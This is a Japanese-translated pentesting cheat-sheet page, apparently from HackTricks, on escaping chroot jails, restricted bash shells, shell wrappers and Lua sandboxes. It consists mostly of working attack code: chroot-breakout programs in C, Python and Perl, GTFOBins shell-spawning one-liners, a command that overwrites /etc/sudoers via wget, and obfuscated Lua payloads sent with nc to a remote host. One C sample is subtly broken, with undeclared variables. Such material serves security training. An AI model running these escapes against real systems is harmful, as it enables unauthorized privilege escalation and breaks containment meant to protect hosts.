# Jails からの脱出

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**

## Chroot Escapes

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
通常、脱出するには chroot 内で root である必要があります。

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) は、以下のシナリオを悪用して `chroot` から脱出するために作られました。

### Root + CWD

> [!WARNING]
> chroot 内で **root** であれば、**別の chroot** を作成して**脱出**できます。これは、(Linux では) 2 つの chroot は共存できないためです。つまり、ディレクトリを作成してからその新しいディレクトリ上で **新しい chroot** を作成し、**自分がその外側にいる**状態にすれば、**新しい chroot の外側**に出られるので、FS の中にいることになります。
>
> これは通常、chroot が作業ディレクトリを指定した場所へ移動しないために起こります。そのため、chroot を作成してもその外側に出られることがあります。

通常、chroot jail 内では `chroot` バイナリは見つかりませんが、バイナリを**コンパイル・アップロード・実行**することはできます:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> これは前のケースと似ていますが、この場合、**攻撃者は現在のディレクトリへのファイルディスクリプタを保存**し、その後、**新しいフォルダに chroot を作成**します。最後に、**chroot の外側にあるその FD** に**アクセス**できるため、それにアクセスして**脱出**します。

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - 子プロセスを作成する (fork)
> - 親プロセスと子プロセスが通信できるように UDS を作成する
> - 子プロセスで別のフォルダに対して chroot を実行する
> - 親プロセスで、新しい子プロセスの chroot の外にあるフォルダの FD を作成する
> - UDS を使って、その FD を子プロセスに渡す
> - 子プロセスがその FD に chdir し、しかもそれは chroot の外にあるため、jail から escape する

### Root + Mount

> [!WARNING]
>
> - root device (/) を chroot 内のディレクトリに mount する
> - そのディレクトリに chroot する
>
> これは Linux では可能

### Root + /proc

> [!WARNING]
>
> - procfs を chroot 内のディレクトリに mount する（まだなら）
> - /proc/1/root のように、root/cwd エントリが異なる pid を探す
> - そのエントリに chroot する

### Root(?) + Fork

> [!WARNING]
>
> - Fork（child proc）を作成し、FS のより深い別のフォルダに chroot してそこへ CD する
> - 親プロセスから、子プロセスがいるフォルダを子プロセスの chroot より前のフォルダへ移動する
> - この子プロセスは、自分が chroot の外にいることに気づく

### ptrace

> [!WARNING]
>
> - 以前は、ユーザーが自分のプロセスを自分自身のプロセスから debug できた... しかし、今ではデフォルトではできない
> - それでも可能なら、プロセスに ptrace して、その中で shellcode を実行できる ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

jail について情報を取得する:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATHを変更する

PATH環境変数を変更できるか確認する
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim を使用する
```bash
:set shell=/bin/sh
:shell
```
### ページャーとヘルプビューアー

多くの制限された環境では、まだ**pager**や**help viewer**が利用可能なままです。これらは通常、`PATH` を再構築しようとするよりも悪用しやすいです。
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git` が利用可能なら、そのヘルプ出力は通常 pager を通ることを覚えておいてください:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

どのバイナリに到達できるか分かったら、まずは明らかなシェル起動コマンドを試してください:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
もし**引数を注入**できるだけで、コマンドを自由に実行できない場合は、**GTFOArgs**も確認してください。

### スクリプトを作成

_/bin/bash_ を内容として持つ実行可能ファイルを作成できるか確認してください
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH から bash を取得する

ssh 経由でアクセスしている場合、制限付きログインシェルの代わりに、サーバーに **別のプログラム** を実行するよう依頼できることがよくあります:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh` がローカルで許可されている数少ないバイナリの1つなら、**GTFOBin** として悪用できることも覚えておいてください:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### 宣言
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

たとえば sudoers ファイルを上書きできます
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

一部の環境では、plain `rbash` に入るのではなく、`git-shell`、`rssh`、`lshell` のような **wrappers** に入れられます:

- `git-shell` は server-side Git commands と、`~/git-shell-commands/` の中にあるものだけを受け付けます。そのディレクトリが存在するなら、`help` を実行して許可された custom actions を列挙してください。そこに **write** できるなら、そのディレクトリに置かれた任意の executable に到達できます。
- `rssh` / `lshell` は一般に `scp`、`sftp`、`rsync`、または Git-style operations  మాత్రమే許可します。その場合はまず **file write primitives** に注目してください: `authorized_keys`、shell startup file、または helper script を writable な場所へアップロードし、その後 `ssh -t ...` で再接続します。
- wrapper が command line だけを filter しているなら、到達可能な binaries を列挙してから **GTFOBins / GTFOArgs** に戻って pivot します。

### Other tricks

Also check:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**It could also be interesting the page:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

python jails から脱出するための trick については次のページを参照してください:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

このページでは、lua 内で利用できる global functions を確認できます: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
ライブラリの関数を**ドットを使わずに呼び出す**ためのいくつかのテクニック:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
ライブラリの関数を列挙する:
```bash
for k,v in pairs(string) do print(k,v) end
```
前の one liner を **異なる lua environment** で実行するたびに、functions の順序が変わることに注意してください。したがって、特定の function を実行する必要がある場合は、異なる lua environments を読み込み、le library の最初の function を呼び出す brute force attack を行うことができます:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**インタラクティブな lua shell を取得する**: 制限された lua shell の中にいる場合、次を呼び出して新しい lua shell（できれば制限なし）を取得できます:
```bash
debug.debug()
```
## References

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
